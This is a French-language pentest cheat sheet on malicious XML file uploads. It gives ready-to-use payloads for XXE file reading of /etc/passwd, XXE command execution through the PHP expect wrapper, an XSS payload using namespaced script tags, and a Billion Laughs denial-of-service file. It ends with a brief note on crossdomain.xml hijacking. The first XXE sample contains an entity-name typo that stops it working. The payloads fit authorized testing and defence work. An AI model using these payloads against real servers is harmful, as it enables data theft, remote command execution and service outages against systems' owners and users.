# XML

**Facteur de risque** : XXE, XXS, DoS

**Extension** : .xml

**Type MIME** : application/xml, text/xml

**Description** : 

L'**Extensible Markup Language** ou **XML** est un langage de balisage, permettant l'échange de contenus complexes.

## Sommaire

- XML External Entity (XXE)

- XSS

- Deny of Service : Billion Laugh Attack

## XML External Entity (XXE)

### Pré-requis

- Le fichier doit être accessible après avoir été uploadé

- Le fichier doit être traité par le serveur

- L'utilisation de wrapper PHP est possible que si le serveur tourne sous PHP

### Attaque

Pour récupérer un fichier (ici `/etc/password`) :

**xxe\_file.xml** 

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xee;</foo>
```

Si l'utilisation de wrapper PHP est autorisé, notamment `expect`, l'exécution de commande est possible (ici `ls`) :

**xxe\_cmd.xml**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "expect://ls">
]>
<foo>&xxe;</foo>
```

## Cross-Site Scripting (XSS)

### Pré-requis

- Le fichier doit être accessible après avoir été uploadé

### Attaque

**xss.xml**

```xml
<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
</body>
</html>
```

Le payload peut être modifié facilement en changeant la balise `<something>`:

```xml
<a:script xmlns:a="http://www.w3.org/1999/xhtml">alert(1)</a:script>
```

## Denial of Service : Billion Laugh Attack

### Pré-requis

- Le fichier doit être accessible après avoir été uploadé

### Attaque

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

## References

- [An In-Depth Look at XML Document Attack Vectors | OPSWAT Blog | OPSWAT](https://www.opswat.com/blog/depth-look-xml-document-attack-vectors)

- XXE
  
  - [Exploitation: XML External Entity (XXE) Injection](https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection)

- XSS
  
  - [PayloadsAllTheThings/XSS Injection at master · swisskyrepo/PayloadsAllTheThings · GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#xss-in-files)

## Todo

- Uploading a “crossdomain.xml” or “clientaccesspolicy.xml” file can
  make a website vulnerable to cross-site content hijacking. These
  files should be uploaded to the root of the website to work.
  However, the “crossdomain.xml” file can be in a subdirectory as long
  as it is allowed in the root “crossdomain.xml” file.
